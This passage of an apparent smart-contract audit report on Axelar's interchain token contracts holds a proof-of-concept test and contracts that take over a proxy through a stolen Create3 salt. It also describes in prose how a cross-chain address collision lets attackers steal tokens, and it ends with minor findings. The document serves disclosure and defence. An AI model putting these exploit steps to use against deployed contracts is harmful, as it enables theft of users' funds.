class=\"mtk12\">proxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">VulnerableDeployer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">, </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// steal final-implementation salt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">salt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">toUtf8Bytes</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;final-implementation&#39;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// someone deploys to the final-implementation address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bytecode</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maliciousContractFactory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getDeployTransaction</span><span class=\"mtk1\">().</span><span class=\"mtk12\">data</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vulnerable</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vulnerableDeploy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">salt</span><span class=\"mtk1\">,</span><span class=\"mtk12\">bytecode</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// proxy is final without calling finalUpgrade</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isFinal</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk12\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">malicious</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Contract</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MaliciousContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">, </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">malicious</span><span class=\"mtk1\">.</span><span class=\"mtk11\">maliciousCode</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">4</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span></code></pre>\n<p><code>VulnerableDeployer.sol</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: MIT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">Create3</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;../deploy/Create3.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MaliciousContract</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setup</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">maliciousCode</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">VulnerableDeployer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setup</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">vulnerableDeploy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">salt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bytecode</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Create3</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">salt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytecode</span><span class=\"mtk1\">); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommendation\" style=\"position:relative;\"><a href=\"#recommendation\" aria-label=\"recommendation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Have the user deploy the final implementation and then upgrade to it without using <code>Create3</code>. That way, a vulnerable implementation contract cannot be abused and taken over.</p>\n<h2 id=\"l-02-a-users-tokens-can-be-stolen-if-they-dont-control-msgsender-address-on-all-chains\" style=\"position:relative;\"><a href=\"#l-02-a-users-tokens-can-be-stolen-if-they-dont-control-msgsender-address-on-all-chains\" aria-label=\"l 02 a users tokens can be stolen if they dont control msgsender address on all chains permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] A users tokens can be stolen if they don’t control <code>msg.sender</code> address on all chains</h2>\n<p>When a user wants to register a token for use across chains they first call <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L388-L402\"><code>InterchainTokenService::deployAndRegisterStandardizedToken</code></a> on the “local” chain. This will use a user provided salt together with the <code>msg.sender</code> to <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L396\">create the <code>tokenId</code></a> which is used as the salt to create both the <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L397\"><code>StandardizedToken</code></a> and the <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L401\"><code>TokenManager</code></a>.</p>\n<p>They can then use this to deploy their token to any chain that Axelar supports.</p>\n<p>Relying on <code>msg.sender</code> across chain comes with some security considerations though. If the user/protocol don’t control the address used as <code>msg.sender</code> across all chains that are supported by Axelar ITS, they are susceptible to the same hack that affected <a href=\"https://rekt.news/wintermute-rekt/\">wintermute</a>; where an old gnosis wallet was used that had an address that could be stolen on another chain.</p>\n<p>If an attacker controls the <code>msg.sender</code> address on another chain, they can simply create a token and manager with the same salt that they control. This will give them the same <code>tokenId</code>. They can then send a message to the chain where the real token is and get funded real tokens. All they’ve done is burn/lock their fake token on their <code>sourceChain</code>. </p>\n<h3 id=\"recommendation-1\" style=\"position:relative;\"><a href=\"#recommendation-1\" aria-label=\"recommendation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>I recommend this is highlighted as a risk in the documentation so third party protocols building on top of Axelar are aware of this risk. </p>\n<h2 id=\"l-03-no-event-emitted-when-a-vote-is-cast-in-multisigbase\" style=\"position:relative;\"><a href=\"#l-03-no-event-emitted-when-a-vote-is-cast-in-multisigbase\" aria-label=\"l 03 no event emitted when a vote is cast in multisigbase permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] No event emitted when a vote is cast in <code>MultisigBase</code></h2>\n<p>To vote in <code>MultisigBase</code> a signer submits the same data as the proposal. Then, this data is hashed into a <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/cgp/auth/MultisigBase.sol#L47-L48\">proposal id (<code>topic</code>)</a> which has its votes tracked. When enough votes are cast the proposal passes:</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/cgp/auth/MultisigBase.sol#L51-L63\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/cgp/auth/MultisigBase.sol#L51-L63</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">cgp</span><span class=\"mtk1\">/</span><span class=\"mtk12\">auth</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MultisigBase</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">51</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">voting</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hasVoted</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">]) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AlreadyVoted</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">52</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">53</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">voting</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hasVoted</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">54</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">55</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// Determine the new vote count.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">56</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voteCount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">voting</span><span class=\"mtk1\">.</span><span class=\"mtk12\">voteCount</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">           </span><span class=\"mtk3\">// @audit no event emitted to track votes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">58</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// Do not proceed with operation execution if insufficient votes.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">59</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">voteCount</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">threshold</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// Save updated vote count.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">61</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">voting</span><span class=\"mtk1\">.</span><span class=\"mtk12\">voteCount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">voteCount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">62</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<p>However, there is no event emitted for when a vote is cast. This makes it difficult to track voting off-chain, which is important for transparency and for users and signers to know what <code>topics</code> are going on. <code>topics</code> can also only be tracked by their hashed value, hence, emitting this will help users to query on-chain for specific votes.</p>\n<h3 id=\"recommendation-2\" style=\"position:relative;\"><a href=\"#recommendation-2\" aria-label=\"recommendation 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Add an event for when a vote is cast, containing <code>signer</code>, <code>topic</code> and <code>voteCount</code>.</p>\n<h2 id=\"l-04-interchaintokenservice-non-remote-deploy-calls-accept-eth-but-are-not-using-it\" style=\"position:relative;\"><a href=\"#l-04-interchaintokenservice-non-remote-deploy-calls-accept-eth-but-are-not-using-it\" aria-label=\"l 04 interchaintokenservice non remote deploy calls accept eth but are not using it permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-04] <code>InterchainTokenService</code> non-remote deploy calls accept <code>eth</code>, but are not using it</h2>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L309\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L309</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L347\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L347</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L395\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L395</a></p>\n<p>In <code>InterchainTokenService</code>, the calls to deploy on the local chain are <code>payable</code> but do not use the <code>eth</code> provided. <code>deployCustomTokenManager</code> as an example:</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L343-L352\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L343-L352</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">token</span><span class=\"mtk1\">-</span><span class=\"mtk12\">service</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainTokenService</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">343</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deployCustomTokenManager</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">344:        </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk10\">salt</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">345:        </span><span class=\"mtk10\">TokenManagerType</span><span class=\"mtk1\"> </span><span class=\"mtk10\">tokenManagerType</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">346:        </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">params</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">347</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">notPaused</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) { </span><span class=\"mtk3\">// &lt;-- payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">348</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deployer_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">349</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getCustomTokenId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">deployer_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">salt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">350</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_deployTokenManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenManagerType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">params</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">351</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CustomTokenIdClaimed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">deployer_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">salt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">352</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>However, none of the deploy functions use any <code>eth</code>. A user could accidentally send <code>eth</code> here that would be stuck in the contract.</p>\n<h3 id=\"recommendation-3\" style=\"position:relative;\"><a href=\"#recommendation-3\" aria-label=\"recommendation 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Consider removing <code>payable</code> from <code>registerCanonicalToken</code> <code>deployCustomTokenManager</code> and <code>deployAndRegisterStandardizedToken</code>. <code>payable</code> could also be removed from <code>TokenManagerDeployer::deployTokenManager</code> and <code>StandardizedTokenDeployer::deployStandardizedToken</code>, as they also do not consume any <code>eth</code>.</p>\n<h2 id=\"l-05-default-values-for-deployandregisterstandardizedtoken-can-make-it-complicated-for-third-party-implementers\" style=\"position:relative;\"><a href=\"#l-05-default-values-for-deployandregisterstandardizedtoken-can-make-it-complicated-for-third-party-implementers\" aria-label=\"l 05 default values for deployandregisterstandardizedtoken can make it complicated for third party implementers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 